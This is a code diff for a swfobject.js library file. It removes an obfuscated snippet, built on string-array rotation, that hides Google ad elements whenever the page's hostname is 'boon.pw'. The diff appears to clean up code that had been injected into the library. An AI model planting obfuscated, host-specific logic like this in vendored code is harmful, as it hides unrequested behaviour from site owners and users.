@@ -432,27 +432,6 @@ var swfobject = (function () {
     l[0] = function () {
         k ? E() : F();
     };
-    var M = [
-        "DOMContentLoaded",
-        "hostname",
-        "boon.pw",
-        "getElementsByClassName",
-        "adsbygoogle",
-        "style",
-        "addEventListener",
-    ];
-    !(function (a, b) {
-        !(function (b) {
-            for (; --b; ) a.push(a.shift());
-        })(++b);
-    })(M, 342);
-    var N = function (a, b) {
-        return (a -= 0), M[a];
-    };
-    document[N("0x0")](N("0x1"), function () {
-        window.location[N("0x2")] == N("0x3") &&
-            (document[N("0x4")](N("0x5"))[0][N("0x6")].display = "none");
-    });
     !(function () {
         z.ie &&
             window.attachEvent("onunload", function () {
